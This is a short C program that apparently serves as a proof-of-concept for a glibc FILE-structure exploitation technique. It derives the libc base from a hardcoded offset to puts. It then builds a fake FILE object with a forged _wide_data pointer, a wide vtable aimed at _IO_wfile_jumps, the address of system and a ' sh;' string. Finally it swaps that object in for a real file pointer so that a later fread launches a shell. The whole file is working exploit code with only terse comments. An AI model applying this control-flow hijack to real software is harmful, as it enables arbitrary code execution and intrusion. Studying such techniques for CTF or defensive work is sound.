#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
size_t getlibc()
{
    puts("getlibc");
    size_t result=&puts-0x75b30;
    return result;
}
unsigned long long seed;
FILE *seed_generator;
size_t fake_io[0x100];
int main()
{   
     setvbuf(stdout, NULL, _IONBF, 0);
    size_t libc_base=getlibc();
    printf("libc base %p",libc_base);
    
    seed_generator = fopen("/dev/urandom", "r");
    fread((char*)&seed, 1, 8, seed_generator);


    fake_io[0]=0x3b687320;  //will cover  content that lock point with 1
    fake_io[0x20/8]=0;  //write_base
    fake_io[0x28/8]=1;  //write_ptr
    fake_io[0xa0/8]=fake_io;   //_wide_data  
    fake_io[0x18/8]=0;         //_wide_data->_IO_write_base
    fake_io[0x30/8]=0;     //_wide_data->_IO_buf_base
    fake_io[0xe0/8]=fake_io;    // _wide_data->__wide_vtable 0xe0
    fake_io[0x68/8]=libc_base+0x4e720;  //system  
    fake_io[0x88/8]=fake_io+0x100/8;  // attention fake_io is long*  , lock  address can be write    [fake_io+8]==0         
    fake_io[0xc0/8]=0;  //mode
    fake_io[0xd8/8]=libc_base+0x1d2648-40; //_IO_wfile_jumps-40

    seed_generator=fake_io;


    fread((char*)&seed, 1, 8, seed_generator);

   

}